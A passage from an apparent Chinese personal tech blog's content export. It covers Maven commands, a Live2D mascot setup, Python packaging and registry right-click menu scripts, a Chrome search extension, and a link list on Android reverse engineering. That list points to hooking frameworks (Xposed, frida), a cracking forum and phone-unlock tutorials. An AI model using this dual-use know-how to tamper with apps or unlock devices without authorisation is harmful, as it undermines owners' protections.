强制检查更新，由于快照版本的更新策略(一天更新几次、隔段时间更新一次)存在，如果想强制更新就会用到此命令: </p><p>mvn clean install-U<br>21. 源码打包：</p><p>mvn source:jar<br>或<br>mvn source:jar-no-fork</p><p>archetype:generate 表示创建个项目<br>-DgroupId 项目包名: com.how2java<br>-DartifactId 项目名称: j2se<br>-DarchetypeArtifactId 项目类型: maven-archetype-quickstart<br>-DinteractiveMode:false 表示前面参数都给了，就不用一个一个地输入了</p><hr><p>java web系统框架:<br><a href="https://mooc1-1.chaoxing.com/nodedetailcontroller/visitnodedetail?courseId=208931964&amp;knowledgeId=330626581">https://mooc1-1.chaoxing.com/nodedetailcontroller/visitnodedetail?courseId=208931964&amp;knowledgeId=330626581</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Live2D添加板娘</title>
      <link href="/2019/03/23/live2D-two/"/>
      <url>/2019/03/23/live2D-two/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>live 2d cubism下载地址：<br><a href="https://getl2d.ordosx.tech/">https://getl2d.ordosx.tech/</a><br>unity SDK下载地址<br><a href="https://github.com/Live2D/CubismUnityComponents">https://github.com/Live2D/CubismUnityComponents</a></p><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><p>打开Git Bash</p><h2 id="先下载live2d"><a href="#先下载live2d" class="headerlink" title="先下载live2d"></a>先下载live2d</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><h3 id="更多模型"><a href="#更多模型" class="headerlink" title="更多模型"></a>更多模型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><h2 id="在根目录-config-yml配置下添加以下参数"><a href="#在根目录-config-yml配置下添加以下参数" class="headerlink" title="在根目录_config.yml配置下添加以下参数"></a>在根目录_config.yml配置下添加以下参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  scriptFrom: <span class="built_in">local</span>  <span class="comment">#默认</span></span><br><span class="line">  pluginRootPath: live2dw/ <span class="comment">#插件在站点上是根目录</span></span><br><span class="line">  pluginJsPath: lib/   <span class="comment">#脚本文件相对于插件根目录路径</span></span><br><span class="line">  pluginModelPath: assets/  <span class="comment">#模型文件相对于与插件根目录路径</span></span><br><span class="line">  tagMode: <span class="literal">false</span>  <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  debug: <span class="literal">false</span>  <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  model:</span><br><span class="line">    use:  live2d-widget-model-z16 <span class="comment">#live2d-widget-model-shizuku 要修改的 </span></span><br><span class="line">  display:</span><br><span class="line">    position: right    <span class="comment">#在屏幕上显示的位置</span></span><br><span class="line">    width: 150     <span class="comment">#宽度</span></span><br><span class="line">    height: 300    <span class="comment">#高度</span></span><br><span class="line">  mobile:  <span class="comment">#是否用于移动端</span></span><br><span class="line">    show: <span class="literal">true</span>  <span class="comment">#手机是否显示</span></span><br></pre></td></tr></table></figure><h2 id="会换装的板娘"><a href="#会换装的板娘" class="headerlink" title="会换装的板娘"></a>会换装的板娘</h2><p>More info: <a href="https://github.com/pangao1990/pangao1990.github.io/tree/master/live2d">GitHub源码地址</a></p><p>解压到本地博客目录的 themes/…/source 下，修改文件夹名为 live2d-widget，修改项目中的 autoload.js 文件<br>将const live2d_path = “<a href="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/&quot;">https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/&quot;</a>; 改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const live2d_path = &quot;/live2d-widget/&quot;;</span><br></pre></td></tr></table></figure><p>该项目需要 jQuery 和 font-awesome 支持。例如在 <head> 中加入：</p><p>在F:\blog\themes\hexo-theme-antiquity\layout\layout.ejs下添加代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;/live2d-widget/autoload.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="%E4%BB%A3%E7%A0%81%E6%B7%BB%E5%8A%A0%E5%9C%B0%E5%9D%802.png"></p><p>想修改看板娘大小、位置、格式、文本内容等，可查看并修改 waifu-tips.js 、 waifu-tips.json 和 waifu.css。</p><p>More info: <a href="https://blog.csdn.net/u011236348/article/details/88169549">参考</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向入坑</title>
      <link href="/2019/03/01/Android/"/>
      <url>/2019/03/01/Android/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><p>先聊一聊什么是HOOK（动态注入技术）技术：<br><a href="https://blog.csdn.net/jiabailong/article/details/52368002">https://blog.csdn.net/jiabailong/article/details/52368002</a><br>使用Hook框架有Xposed、CydiaSubstrate和ADBI/DDI…</p><hr><p>Xposed框架（一款可以在不修改APK的情况下影响程序运行（修改系统）的框架服务）<br><a href="http://xposed.appkg.com/">Xposed中文网站</a><br><a href="https://blog.csdn.net/tangyuan569/article/details/103751699">https://blog.csdn.net/tangyuan569/article/details/103751699</a></p><p>常见Android tools：<br><a href="https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=230">https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=230</a><br>分享一些最新漏洞(虽然多半还是自己看):<br>有关ctftools工具：<br><a href="https://www.freebuf.com/sectool/227330.html">https://www.freebuf.com/sectool/227330.html</a><br>漏洞分析：<br><a href="https://www.freebuf.com/articles/terminal/226947.html">https://www.freebuf.com/articles/terminal/226947.html</a><br>工具：<br><a href="https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=230">https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=230</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=134">https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=134</a></p><hr><h3 id="android手机搭建web服务器"><a href="#android手机搭建web服务器" class="headerlink" title="android手机搭建web服务器"></a>android手机搭建web服务器</h3><p><a href="https://blog.csdn.net/weixin_43343423/article/details/103990512">https://blog.csdn.net/weixin_43343423/article/details/103990512</a></p><hr><h3 id="Android逆向之hook框架frida篇"><a href="#Android逆向之hook框架frida篇" class="headerlink" title="Android逆向之hook框架frida篇"></a>Android逆向之hook框架frida篇</h3><p><a href="https://bbs.pediy.com/thread-226846.htm">https://bbs.pediy.com/thread-226846.htm</a><br><a href="https://www.jianshu.com/p/ca8381d3e094">https://www.jianshu.com/p/ca8381d3e094</a><br><a href="https://www.jianshu.com/p/c349471bdef7">https://www.jianshu.com/p/c349471bdef7</a></p><hr><p><a href="https://blog.csdn.net/qq_37149418/article/details/104710211?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158686360919725247652724%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158686360919725247652724&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-2">https://blog.csdn.net/qq_37149418/article/details/104710211?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158686360919725247652724%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158686360919725247652724&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-2</a></p><p><a href="https://blog.csdn.net/new_one_object/article/details/79888638?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158686360919725247652724%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158686360919725247652724&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-1">https://blog.csdn.net/new_one_object/article/details/79888638?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158686360919725247652724%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158686360919725247652724&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-1</a></p><p><a href="https://blog.csdn.net/yang1226341090/article/details/80377811?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-11&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-11">https://blog.csdn.net/yang1226341090/article/details/80377811?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-11&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-11</a></p><p><a href="https://blog.csdn.net/iamcodingmylife/article/details/84975343">https://blog.csdn.net/iamcodingmylife/article/details/84975343</a></p><p><a href="https://blog.csdn.net/qq_20084101/article/details/80816045?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4">https://blog.csdn.net/qq_20084101/article/details/80816045?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4</a></p><hr><p><a href="http://cve.mitre.org/">http://cve.mitre.org/</a><br>src提交平台：<br>安全客：<br><a href="https://www.anquanke.com/src">https://www.anquanke.com/src</a><br>i春秋：<br><a href="https://www.ichunqiu.com/src">https://www.ichunqiu.com/src</a><br>漏洞银行：<br><a href="https://www.butian.net/">https://www.butian.net/</a><br>阿里云<br><a href="https://security.alibaba.com/">https://security.alibaba.com/</a><br>腾讯：<br><a href="https://security.tencent.com/index.php">https://security.tencent.com/index.php</a></p><hr><h2 id="华为解锁教程"><a href="#华为解锁教程" class="headerlink" title="华为解锁教程"></a>华为解锁教程</h2><p><a href="http://www.oppojiesuo.com/?cat=4">http://www.oppojiesuo.com/?cat=4</a><br><a href="https://www.jkmeng.cn/2433.html">https://www.jkmeng.cn/2433.html</a><br><a href="https://www.52pojie.cn/thread-1047448-1-1.html">https://www.52pojie.cn/thread-1047448-1-1.html</a><br><a href="http://www.oppojiesuo.com/?p=1907">http://www.oppojiesuo.com/?p=1907</a><br><a href="https://www.jkmeng.cn/app/xposed">https://www.jkmeng.cn/app/xposed</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自制Python小工具</title>
      <link href="/2018/09/16/Python-tools/"/>
      <url>/2018/09/16/Python-tools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>pip安装需要使用的模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.douban.com/simple/ pyinstaller</span><br></pre></td></tr></table></figure><p>打包.exe文件</p><p>如果Python安装目录下的Scripts路径是加到了系统环境变量中，那么可以在任意路劲下直接运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller.exe -F -icon=F:\testTools F:/code/python-tools/test.py</span><br></pre></td></tr></table></figure><p>如果带-icon参数打包运行时报错，那么可以在你想保存的文件路劲下直接运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller.exe -F F:/code/python-tools/test.py</span><br></pre></td></tr></table></figure><p>1.程序设置自定义图标：pyinstaller -F -i ico_path  py_path </p><p>首先需要下载一张正常的ico，不能用直接修改后缀的。</p><p>下载图片：　　  <a href="https://www.easyicon.net/">https://www.easyicon.net</a></p><p>图片改为ico:　　<a href="http://www.ico.la/">http://www.ico.la/</a></p><p>输入命令 pyinstaller -F -i “demo.ico” “main.py”</p><p>2.报错提示：</p><p>pyinstaller -F -i “demo.ico” “main.py” 命令格式一定是先图标路径，再程序路径。</p><p>路径最好为英文，没有中文字符；脚本名称里没有特殊字符如 .</p><p>使用utf8编码</p><p>图标文件必须是正常格式，不能直接更改后缀。</p><p>tuble index out of range —》pyinstaller版本尚未支持python的版本</p><p>3.窗口程序</p><p>使用 pyinstaller -F -w  -i ico_path  py_path ，这样脚本不会弹出命令窗，前提是用了GUI库. </p><hr><h2 id="Python开发右键菜单功能"><a href="#Python开发右键菜单功能" class="headerlink" title="Python开发右键菜单功能"></a>Python开发右键菜单功能</h2><p>右键菜单功能使用Pyhton内置的_winreg模块</p><h3 id="右键菜单"><a href="#右键菜单" class="headerlink" title="右键菜单"></a>右键菜单</h3><ul><li>注册表编辑器添加右键菜单的基本原理<br>win + R快捷键打开运行命令输入框，输入 <code>regedit</code> 命令并回车，打开注册表编辑器。<br>目录–&gt;树形结构，树中的每个项目都称为key，也就是注册表的键，其实我们添加右键菜单，本质上就是在某个父键下面新增一个具体执行某种操作的子键。<br><img src="1.png"><br>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell,这个就是添加文件夹空白处右键菜单的父键，可以看到当前该父键下已经有三个子键，也就是有三个右键菜单了</li></ul><p><img src="2.png"><br>git_shell展开，可以看到还有一个名为command的子键，还可以在注册表编辑器右边看到git_shell这个键的详情，Git Bash Here这个右键菜单，执行git-bash.exe<br>并且自动带上了–cd=%v.这样一个参数。还可以右键点击名称，修改这个键的值</p><p>如果不想使用某个右键菜单，只需把这个右键菜单的键（包括子键）在注册表编辑器中删掉即可</p><ul><li>添加右键菜单打印字符串<br>找到注册表中的shell，在HKEY_CLASSES_ROOT/Directory/Background/shell键上面执行（右键–&gt;新建–&gt;项），并为HelloWorld子键添加一个名为command的子键：</li></ul><p>代码中添加注册表键的command命令时，是以%v代表一个路径参数的，还有其他几种参数可以使用：</p><p>系统默认变量的含义：<br>%1  表示程序操作的文件<br>%2  表示系统默认的打印机<br>%3  表示资料扇区<br>%4  表示操作的Port端口<br>“%v”  程序操作的路径</p><p>删除上面添加的Show file path右键菜单的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import _winreg as reg</span><br><span class="line">def delete_reg_key(root_key,key,menu_name):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    删除一个右键菜单注册表子键</span><br><span class="line">    :param root_key:根键</span><br><span class="line">    :param key: 父键</span><br><span class="line">    :param menu_name: 菜单子键名称</span><br><span class="line">    :return: None</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        parent_key = reg.OpenKey(root_key,key)</span><br><span class="line">    except Exception as msg:</span><br><span class="line">        print msg</span><br><span class="line">        return</span><br><span class="line">    if parent_key:</span><br><span class="line">        try:</span><br><span class="line">            menu_key = reg.OpenKey(parent_key,menu_name)</span><br><span class="line">        except Exception as msg:</span><br><span class="line">            print msg</span><br><span class="line">            return</span><br><span class="line">        if menu_key:</span><br><span class="line">            try:</span><br><span class="line">                # 必须先删除子键的子键，才能删除子键本身</span><br><span class="line">                reg.DeleteKey(menu_key,&#x27;command&#x27;)</span><br><span class="line">            except Exception as msg:</span><br><span class="line">                print msg</span><br><span class="line">                return</span><br><span class="line">            else:</span><br><span class="line">                reg.DeleteKey(parent_key,menu_name)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    menu_name = &#x27;Show file path&#x27;</span><br><span class="line">    delete_reg_key(reg.HKEY_CLASSES_ROOT,r&#x27;*\\shell&#x27;,menu_name)</span><br><span class="line">    delete_reg_key(reg.HKEY_CLASSES_ROOT, r&#x27;Directory\\shell&#x27;, menu_name)</span><br><span class="line">    delete_reg_key(reg.HKEY_CLASSES_ROOT, r&#x27;Directory\\Background\\shell&#x27;, menu_name)</span><br><span class="line">    delete_reg_key(reg.HKEY_CLASSES_ROOT, r&#x27;Drive\\shell&#x27;, menu_name)</span><br></pre></td></tr></table></figure><h2 id="实现”用Chrome浏览器打开文件”的右键菜单"><a href="#实现”用Chrome浏览器打开文件”的右键菜单" class="headerlink" title="实现”用Chrome浏览器打开文件”的右键菜单"></a>实现”用Chrome浏览器打开文件”的右键菜单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import _winreg as reg</span><br><span class="line">def add_context_menu(menu_name,command,reg_root_key_path,reg_key_path,shortcut_key):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    封装的添加一个右键菜单的方法</span><br><span class="line">    :param menu_name: 显示的菜单名称</span><br><span class="line">    :param command: 菜单执行的命令</span><br><span class="line">    :param reg_root_key_path: 注册表根键路径</span><br><span class="line">    :param reg_key_path: 要添加到的注册表父键的路径（相对路径）</span><br><span class="line">    :param shortcut_key: 菜单快捷键，如：&#x27;S&#x27;</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    # 打开名称父键</span><br><span class="line">    key = reg.OpenKey(reg_root_key_path, reg_key_path)</span><br><span class="line">    # 为key创建一个名称为menu_name的sub_key，并设置sub_key的值为menu_name加上快捷键，数据类型为REG_SZ字符串类型</span><br><span class="line">    reg.SetValue(key, menu_name, reg.REG_SZ, menu_name + &#x27;(&amp;&#123;0&#125;)&#x27;.format(shortcut_key))</span><br><span class="line"></span><br><span class="line">    # 打开刚刚创建的名为menu_name的sub_key</span><br><span class="line">    sub_key = reg.OpenKey(key, menu_name)</span><br><span class="line">    # 为sub_key添加名为&#x27;command&#x27;的子键，并设置其值为command + &#x27; &quot;%v&quot;&#x27;，数据类型为REG_SZ字符串类型</span><br><span class="line">    reg.SetValue(sub_key, &#x27;command&#x27;, reg.REG_SZ, command + &#x27; &quot;%v&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">    # 关闭sub_key和key</span><br><span class="line">    reg.CloseKey(sub_key)</span><br><span class="line">    reg.CloseKey(key)</span><br><span class="line"></span><br><span class="line">def add_open_with_chrome():</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    添加&quot;用谷歌浏览器打开&quot;右键菜单</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    # 右键菜单名</span><br><span class="line">    menu_name = &#x27;Open with chrome&#x27;</span><br><span class="line">    # Chrome浏览器可执行文件的本地绝对路径</span><br><span class="line">    command = r&#x27;C:\\Users\\Administrator.PC-20170728DWIF\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe&#x27;</span><br><span class="line">    # 注册表根键</span><br><span class="line">    reg_root_key_path = reg.HKEY_CLASSES_ROOT</span><br><span class="line">    # 注册表父键</span><br><span class="line">    reg_key_path = r&#x27;*\\shell&#x27;</span><br><span class="line">    # 快捷键</span><br><span class="line">    shortcut_key = &#x27;C&#x27;</span><br><span class="line">    add_context_menu(menu_name, command, reg_root_key_path, reg_key_path, shortcut_key)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    add_open_with_chrome()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.jianshu.com/p/b9ef487d7c87">https://www.jianshu.com/p/b9ef487d7c87</a></p><hr><h2 id="Chrome-增加-右键菜单项-实现多搜索"><a href="#Chrome-增加-右键菜单项-实现多搜索" class="headerlink" title="Chrome 增加 右键菜单项 实现多搜索"></a>Chrome 增加 右键菜单项 实现多搜索</h2><p>1、随地创建一个文件包并命名</p><p>2、文件包内创建以下文件：</p><p>2.1 ./manifest.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">  <span class="attr">&quot;manifest_version&quot;</span>:<span class="number">2</span>, <span class="comment">//必需是2</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BaiduSeachString&quot;</span>,  </span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.1.0&quot;</span>,  </span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;走百度搜索.&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;icons&quot;</span>: </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="attr">&quot;16&quot;</span>: <span class="string">&quot;sicon.png&quot;</span>,  <span class="comment">//当前路径中的图标           </span></span><br><span class="line">    <span class="attr">&quot;48&quot;</span>: <span class="string">&quot;sicon.png&quot;</span>,            </span><br><span class="line">    <span class="attr">&quot;128&quot;</span>: <span class="string">&quot;sicon.png&quot;</span> </span><br><span class="line">  &#125;,    </span><br><span class="line">  <span class="attr">&quot;background&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: [<span class="string">&quot;BDSCHbackground.js&quot;</span>] <span class="comment">//菜单功能</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;permissions&quot;</span>: [<span class="string">&quot;contextMenus&quot;</span>]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2.2 ./BDSCHbackground.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chrome.contextMenus.create(&#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;使用度娘搜索：%s&#x27;</span>, <span class="comment">// %s表示选中的文字</span></span><br><span class="line">    <span class="attr">contexts</span>: [<span class="string">&#x27;selection&#x27;</span>], <span class="comment">// 只有当选中文字时才会出现此右键菜单</span></span><br><span class="line">    <span class="attr">onclick</span>: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意不能使用location.href，因为location是属于background的window对象</span></span><br><span class="line">        chrome.tabs.create(&#123;<span class="attr">url</span>: <span class="string">&#x27;https://www.baidu.com/s?ie=utf-8&amp;wd=&#x27;</span> + <span class="built_in">encodeURI</span>(params.selectionText)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>2.3 ./sicon.png<br>随便找个PNG的图片当做log。越小越好。</p><p>3、打开Chrome右上角找到”更多工具-&gt;扩展程序“中，加载已解压文件，选择你创建的哪个文件包，即可。</p><hr><h2 id="python执行系统命令"><a href="#python执行系统命令" class="headerlink" title="python执行系统命令"></a>python执行系统命令</h2><ol><li>相关基础模块介绍</li><li>1 显示当前日期<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">d = datetime.datetime.now()</span><br><span class="line">dTime = d.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">hour= d.hour</span><br><span class="line"><span class="built_in">print</span>(hour)</span><br><span class="line"><span class="built_in">print</span>(dTime)</span><br></pre></td></tr></table></figure></li><li>2 cmd下执行命令<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">command = <span class="string">&#x27;nmap localhost&#x27;</span></span><br><span class="line">status=os.system(command)</span><br><span class="line"><span class="built_in">print</span>(status)</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="socket-网络编程"><a href="#socket-网络编程" class="headerlink" title="socket 网络编程"></a>socket 网络编程</h2><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><ul><li>connect(address) #远程连接计算机</li><li>send(byte[,flags]) #发送数据</li><li>recv(bufsize[,flags]) #接收数据</li><li>bind(address) #绑定地址</li><li>listen(backlog) #开始监听,等待客户端连接</li><li>accept() #响应客户端的一个请求,接收请求</li><li>socket.gethostname() 